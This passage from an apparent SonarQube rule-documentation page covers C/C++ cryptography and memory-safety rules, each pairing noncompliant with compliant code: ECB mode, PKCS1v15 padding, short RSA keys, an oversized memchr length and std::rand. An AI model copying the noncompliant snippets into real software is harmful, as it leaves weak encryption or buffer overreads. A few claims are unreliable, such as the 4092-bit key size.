<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create("AES-256/ECB", Botan::ENCRYPTION); // Noncompliant
}
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;botan/rng.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/rsa.h&gt;
#include &lt;botan/pubkey.h&gt;

void encrypt() {
  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);
  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);

  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), "PKCS1v15"); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create("AES-256/GCM", Botan::ENCRYPTION);
}
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
#include &lt;botan/rng.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/rsa.h&gt;
#include &lt;botan/pubkey.h&gt;

void encrypt() {
  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);
  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);

  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), "OAEP");
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: use authenticated encryption modes</h4>
<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul>
  <li> CCM: <code>Counter with CBC-MAC</code> </li>
  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>
  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>
  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>
  <li> OCB: <code>Offset Codebook Mode</code> </li>
</ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly
instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5782">
              cpp:S5782
            </a>
          </td>
          <td>
            <details>
              <p>Some POSIX functions take one argument that is a buffer and another one that represents the size of the buffer. It is up to the developer to make
sure the two arguments do match and that the size argument does not exceed the buffer’s size.</p>
<h2>Why is this an issue?</h2>
<p>When the size argument exceeds the actual size of the buffer, the memory management functions will either read or write data past the buffer memory
boundary into adjacent memory. Because the memory might be uninitialized or contain other pieces of data, the behavior of the affected function can
not be predicted and will likely trigger bugs.</p>
<h3>What is the potential impact?</h3>
<p>Buffer boundaries violations can lead to serious security issues.</p>
<h4>Information disclosure</h4>
<p>In some scenarios, insecure functions can lead to information disclosure. For instance, if an attacker can cause a buffer overread, they might be
able to disclose data in memory that they’re not supposed to have access to. This could potentially allow them to access sensitive information, such
as passwords or encryption keys. An example of a buffer overread is provided with the Heartbleed vulnerability. ==== Code execution</p>
<p>In some cases, an attacker can craft input in a way that allows them to gain unauthorized access to your system. For example, they might be able to
overwrite a function’s return address in memory, causing your program to execute code of the attacker’s choosing. This could potentially give the
attacker full control over your system.</p>
<h4>Denial of service</h4>
<p>If an attacker can trigger a buffer overflow by providing oversized input, it can cause the program to crash. If the attacker repeats this process,
it can continually disrupt the service, denying access to other users. This can be particularly damaging for services that require high availability,
such as online platforms or databases.</p>
<p>In some cases, the input might cause the program to enter an infinite loop or consume excessive memory, slowing down the system or even causing it
to become unresponsive. This type of attack is known as a resource exhaustion DoS attack.</p>
<h3>Exceptions</h3>
<p>Functions related to sockets using the type <code>socklen_t</code> are not checked. This is because these functions are using a C-style polymorphic
pattern using <code>union</code>. It relies on a mismatch between allocated memory and sizes of structures and it creates false positives.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>In the following code example, <code>memchr</code> is used to find the first occurrence of the <code>@</code> character in a buffer,
<code>array</code>. The second argument does not match the size of this buffer, so it may find an occurrence of the character after the end of the
buffer and read data it is not supposed to. If the returned <code>pos</code> pointer is later used to write characters, this could unexpectedly
overwrite data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
char array[10];
initialize(array);
char *pos = memchr(array, '@', 42); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
char array[10];
initialize(array);
char *pos = memchr(array, '@', sizeof(array));
</pre>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Heartbleed - <a href="https://heartbleed.com/">The Heartbleed Bug</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 - A06 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/119">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory
  Buffer</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/131">CWE-131 - Incorrect Calculation of Buffer Size</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/788">CWE-788 - Access of Memory Location After End of Buffer</a> </li>
</ul>
<h3>External coding guidelines</h3>
<ul>
  <li> CERT - <a href="https://wiki.sei.cmu.edu/confluence/x/wtYxBQ">ARR30-C. - Do not form or use out-of-bounds pointers or array subscripts</a>
  </li>
  <li> CERT - <a href="https://wiki.sei.cmu.edu/confluence/x/i3w-BQ">STR50-CPP. - Guarantee that storage for strings has sufficient space for
  character data and the null terminator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S4423">
              cpp:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in cURL</h2>
<h3>Code examples</h3>
<p>The following code samples attempt to create an HTTP request.</p>
<h4>Noncompliant code example</h4>
<p>This sample uses Curl’s default TLS algorithms, which are weak cryptographical algorithms: TLSv1.0 and LTSv1.1.</p>
<pre data-diff-id="11" data-diff-type="noncompliant">
#include &lt;curl/curl.h&gt;

void encrypt() {
    CURL *curl;
    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();                                      // Noncompliant
    curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/");

    curl_easy_perform(curl);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
#include &lt;curl/curl.h&gt;

void encrypt() {
    CURL *curl;
    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/");
    curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);

    curl_easy_perform(curl);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S4426">
              cpp:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul>
  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>
  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul>
      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li>
    </ul>  </li>
</ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/pubkey.h&gt;
#include &lt;botan/rng.h&gt;
#include &lt;botan/rsa.h&gt;

void encrypt() {
    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);
    Botan::RSA_PrivateKey                           rsaKey(*rng, 1024); // Noncompliant
}
</pre>
<p>Here is an example with the generation of a key as part of a Discrete Logarithmic (DL) group, a Digital Signature Algorithm (DSA) parameter:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;botan/dl_group.h&gt;

void encrypt() {
    Botan::DL_Group("dsa/botan/1024"); // Noncompliant
}
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
#include &lt;botan/ec_group.h&gt;

void encrypt() {
    Botan::EC_Group("secp160k1"); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/pubkey.h&gt;
#include &lt;botan/rng.h&gt;
#include &lt;botan/rsa.h&gt;

void encrypt() {
    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);
    Botan::RSA_PrivateKey                           rsaKey(*rng, 2048);
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
#include &lt;botan/dl_group.h&gt;

void encrypt() {
    Botan::DL_Group("dsa/botan/2048");
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
#include &lt;botan/ec_group.h&gt;

void encrypt() {
    Botan::EC_Group("secp224k1");
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of
<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>
<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve
parameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves
currently include:</p>
<ul>
  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>
  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>
  <li> Curve448. </li>
  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>
</ul>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
"post-quantum") counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation">Learn more here</a>.</p>
<h2>Resources</h2>
<ul>
  <li> Documentation
    <ul>
      <li> NIST Documentation - <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf">NIST SP 800-186: Recommendations
      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>
      <li> IETF - <a href="https://datatracker.ietf.org/doc/html/rfc5639">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and
      Curve Generation</a> </li>
    </ul>  </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S2245">
              cpp:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386">CVE-2013-6386</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419">CVE-2006-3419</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the functions rely on a pseudorandom number generator, they should not be used for security-critical applications or for protecting sensitive
data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use functions which rely on a strong random number generator such as <code>randombytes_uniform()</code> or <code>randombytes_buf()</code> from
  <code>libsodium</code>, or <code>randomize()</code> from Botan. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;random&gt;
// ...

void f() {
  int random_int = std::rand(); // Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;sodium.h&gt;
#include &lt;botan/system_rng.h&gt;
// ...

void f() {
  char random_chars[10];
  randombytes_buf(random_chars, 10); // Compliant
  uint32_t random_int = randombytes_uniform(10); // Compliant

  uint8_t random_chars[10];
  Botan::System_RNG system;
  system.randomize(random_chars, 10); // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/338">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/330">CWE-330 - Use of Insufficiently Random Values</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1241">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/UNcxBQ">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/2ns-BQ">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5527">
              cpp:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
